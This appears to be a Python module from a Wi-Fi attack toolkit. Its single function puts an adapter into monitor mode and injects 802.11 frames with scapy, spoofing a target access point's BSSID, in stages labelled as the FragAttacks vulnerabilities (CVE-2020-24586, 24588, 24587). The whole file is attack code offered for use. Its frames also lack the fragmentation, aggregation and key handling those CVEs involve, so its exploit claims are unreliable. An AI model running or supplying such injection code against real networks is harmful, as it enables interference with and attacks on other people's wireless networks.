#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import scapy.all as scapy
from utils.hardware import interface, hardware_available, adapter_detected
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status, ProgressDisplay
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag
from utils.logger import log_capture


def fragattacks_attack(bssid: str, channel: str = "1") -> bool:
    """Fragmentation and aggregation attacks."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return False

    print_status(f"FragAttacks deployment: {bssid}", "info")
    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return False

    if not set_channel(channel):
        return False

    set_cancel_flag(False)
    target_mac = bssid
    broadcast = "ff:ff:ff:ff:ff:ff"

    # Fragmentation attack
    print_status("Executing fragmentation attack (CVE-2020-24586)", "info")
    for i in range(10):
        if is_cancelled():
            return False
        frag_payload = f"FRAGMENT_{i:04d}_" * 20
        frag_frame = scapy.RadioTap() / scapy.Dot11(
            addr1=broadcast,
            addr2=target_mac,
            addr3=target_mac,
            type=0,
            subtype=8
        ) / scapy.Dot11QoS() / scapy.LLC() / scapy.SNAP() / frag_payload
        scapy.sendp(frag_frame, iface=mon_iface, count=2, inter=0.1)

    time.sleep(2)

    # Aggregation attack
    print_status("Executing aggregation attack (CVE-2020-24588)", "info")
    agg_payload = "A" * 1500
    agg_frame = scapy.RadioTap() / scapy.Dot11(
        addr1=broadcast,
        addr2=target_mac,
        addr3=target_mac
    ) / scapy.Dot11QoS() / scapy.LLC() / scapy.SNAP() / agg_payload
    scapy.sendp(agg_frame, iface=mon_iface, count=5, inter=0.05)

    # Mixed key attack
    print_status("Mixed key attack (CVE-2020-24587)", "info")
    for key_type in [b'\x00' * 16, b'\xff' * 16]:
        if is_cancelled():
            return False
        mixed_frame = scapy.RadioTap() / scapy.Dot11(
            addr1=broadcast,
            addr2=target_mac,
            addr3=target_mac
        ) / scapy.Dot11QoS() / scapy.LLC() / scapy.SNAP() / key_type * 100
        scapy.sendp(mixed_frame, iface=mon_iface, count=3, inter=0.2)

    log_capture("fragattacks", bssid, "", None)
    print_status(f"FragAttacks delivered to {bssid}", "success")
    return True
